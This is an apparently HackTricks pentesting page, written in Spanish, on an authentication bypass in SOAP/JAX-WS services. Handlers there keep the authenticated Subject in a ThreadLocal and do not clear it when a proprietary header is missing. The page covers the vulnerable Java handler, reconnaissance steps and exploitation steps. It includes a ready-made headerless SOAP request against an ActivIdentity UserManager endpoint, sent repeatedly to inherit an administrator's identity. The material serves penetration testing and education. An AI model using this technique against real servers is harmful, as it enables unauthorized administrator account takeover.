# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Algunas cadenas de middleware almacenan el `Subject`/`Principal` autenticado dentro de un `ThreadLocal` estático y solo lo actualizan cuando llega un encabezado SOAP propietario.
- Debido a que WebLogic/JBoss/GlassFish reciclan los hilos de trabajo, omitir ese encabezado provoca que el último `Subject` privilegiado procesado por el hilo sea reutilizado silenciosamente.
- Bombardea el endpoint vulnerable con cuerpos SOAP bien formados pero sin encabezado hasta que un hilo reutilizado te conceda el contexto de administrador robado.

## Causa raíz

Manejadores similares al siguiente solo sobrescriben la identidad local del hilo cuando el encabezado personalizado está presente, por lo que el contexto de la solicitud anterior persiste:
```java
public boolean handleMessage(SOAPMessageContext ctx) {
if (!outbound) {
SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
SOAPHeaderElement e = findHeader(hdr, subjectName);
if (e != null) {
SubjectHolder.setSubject(unmarshal(e));
}
}
return true;
}
```
## Reconocimiento

1. Enumera las reglas de reverse proxy / enrutamiento para localizar árboles SOAP ocultos que puedan bloquear `?wsdl` pero aceptar POSTs (asócialos con el flujo en [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Desempaqueta los artefactos EAR/WAR/EJB (`unzip *.ear`) e inspecciona `application.xml`, `web.xml`, las anotaciones `@WebService` y las handler chains (p. ej., `LoginHandlerChain.xml`) para descubrir la clase del handler, el SOAP header QName y los nombres de los EJB subyacentes.
3. Si faltan metadatos, prueba por fuerza bruta rutas probables `ServiceName?wsdl` o relaja temporalmente los proxies del laboratorio, luego importa cualquier WSDL recuperado en herramientas como [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) para generar envelopes base.
4. Revisa las fuentes del handler buscando `ThreadLocal` keepers (p. ej., `SubjectHolder.setSubject()`) que nunca se limpian cuando el header de autenticación falta o está mal formado.

## Explotación

1. Envía una solicitud válida **con** el encabezado propietario para conocer los códigos de respuesta normales y cualquier error usado para tokens inválidos.
2. Reenvía el mismo cuerpo SOAP omitiendo el header. Mantén el XML bien formado y respeta los namespaces requeridos para que el handler termine sin errores.
3. Itera la solicitud; cuando caiga en un thread que previamente ejecutó una acción privilegiada, el `Subject` reutilizado desbloquea operaciones protegidas como gestores de usuarios o de credenciales.
```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
<soapenv:Header/>
<soapenv:Body>
<jax:findUserIds>
<arg0></arg0>
<arg1>spl*</arg1>
</jax:findUserIds>
</soapenv:Body>
</soapenv:Envelope>
```
## Validando el Bug

- Adjunta JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) u ganchos de depuración similares para observar el contenido de `ThreadLocal` antes y después de cada llamada, confirmando que una petición no autenticada heredó un `Subject` de administrador previo.

## Referencias

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
